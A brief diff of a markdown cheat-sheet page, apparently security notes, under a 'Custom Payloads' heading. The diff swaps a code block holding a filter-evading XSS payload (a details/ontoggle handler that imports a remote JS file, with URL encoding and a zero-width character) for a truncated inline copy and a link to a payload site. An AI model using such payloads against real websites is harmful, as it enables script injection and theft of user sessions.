@@ -4,11 +4,8 @@
 
 <summary>Custom Payloads</summary>
 
-{% code lineNumbers="true" fullWidth="false" %}
-```
-111">><details/open/%253e/ontoggle​=import(`<link-to-js-payload>
-```
-{% endcode %}
+* `` 111">><details/open/%253e/ontoggle​=import(` ``
+* [xssnow](https://xssnow.in/)
 
 </details>
 
